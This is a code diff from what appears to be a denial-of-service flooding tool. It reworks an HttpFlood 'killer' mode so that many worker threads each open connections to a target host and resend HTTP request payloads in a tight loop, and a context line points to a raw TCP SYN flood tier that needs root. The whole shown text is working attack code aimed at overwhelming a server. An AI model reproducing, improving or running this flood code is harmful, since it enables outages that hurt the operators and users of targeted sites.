@@ -1097,33 +1097,10 @@ class HttpFlood(Thread):
                        synevent: Event, is_https: bool, port: int) -> None:
         buf_size = KILLER_SNDBUF_SIZE
 
-        # Build mega buffer: flatten ALL payloads into one giant bytearray
-        # Workers just send slices of this — zero Python overhead per request
-        mega = b"".join(randchoice(payloads) for _ in range(KILLER_MEGA_COUNT))
-        mega_len = len(mega)
-
-        # Pre-warm connections (establish before workers start)
-        pre_warmed = []
-        n_warm = min(KILLER_MAX_WORKERS, 300)
-        for i in range(n_warm):
-            try:
-                s = _killer_open_connection(host, port, is_https)
-                s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
-                pre_warmed.append(s)
-            except Exception:
-                pass
-
-        # Submit one worker per pre-warmed connection — ultra-tight send loop
-        for s in pre_warmed:
-            _killer_pool.submit(_killer_super_worker, s, mega, mega_len,
-                                KILLER_MEGA_CHUNK, synevent)
-
-        # Launch extra workers that open their own connections
-        remaining = max(KILLER_MAX_WORKERS - len(pre_warmed), 0)
-        thread_args = (mega, mega_len, KILLER_MEGA_CHUNK,
-                       host, port, is_https, synevent, buf_size)
-        for _ in range(remaining):
-            _killer_pool.submit(_killer_connect_worker, *thread_args)
+        # Submit connect workers FIRST — they open connections and send immediately
+        args_list = (payloads, host, port, is_https, synevent, buf_size)
+        for _ in range(KILLER_MAX_WORKERS):
+            _killer_pool.submit(_killer_connect_worker, *args_list)
 
         # Tier 3: Raw TCP SYN flood (admin/root only, not for HTTPS)
         if not is_https:
@@ -1523,42 +1500,29 @@ def _killer_open_connection(host: str, port: int, is_https: bool) -> Any:
     return sock
 
 
-def _killer_super_worker(sock: socket, mega: bytes, mega_len: int,
-                         chunk_size: int, synevent: Event) -> None:
+def _killer_connect_worker(payloads: List[bytes], host: str, port: int,
+                           is_https: bool, synevent: Event, buf_size: int) -> None:
+    """Worker: opens connection, sends complete HTTP requests in a tight loop."""
+    n = len(payloads)
+    idx = randint(0, n - 1)
     global BYTES_SEND, REQUESTS_SENT
-    pos = 0
-    batch = 0
-    while synevent.is_set():
-        end = min(pos + chunk_size, mega_len)
-        try:
-            sock.send(mega[pos:end])
-        except Exception:
-            break
-        pos = end
-        if pos >= mega_len:
-            pos = 0
-        batch += 1
-        if batch >= KILLER_BATCH_UPDATE:
-            BYTES_SEND += batch * chunk_size
-            REQUESTS_SENT += batch
-            batch = 0
-    Tools.safe_close(sock)
-    if batch:
-        BYTES_SEND += batch * chunk_size
-        REQUESTS_SENT += batch
-
-
-def _killer_connect_worker(mega: bytes, mega_len: int, chunk_size: int,
-                           host: str, port: int, is_https: bool,
-                           synevent: Event, buf_size: int) -> None:
-    """Worker that opens its own connection, then enters the tight send loop."""
     while synevent.is_set():
         try:
             s = _killer_open_connection(host, port, is_https)
             s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
         except Exception:
             continue
-        _killer_super_worker(s, mega, mega_len, chunk_size, synevent)
+        try:
+            while synevent.is_set():
+                s.sendall(payloads[idx])
+                BYTES_SEND += len(payloads[idx])
+                REQUESTS_SENT += 1
+                idx += 1
+                if idx >= n:
+                    idx = 0
+        except Exception:
+            pass
+        Tools.safe_close(s)
 
 
 def _killer_t3_raw_tcp(host: str, port: int, synevent: Event) -> None:
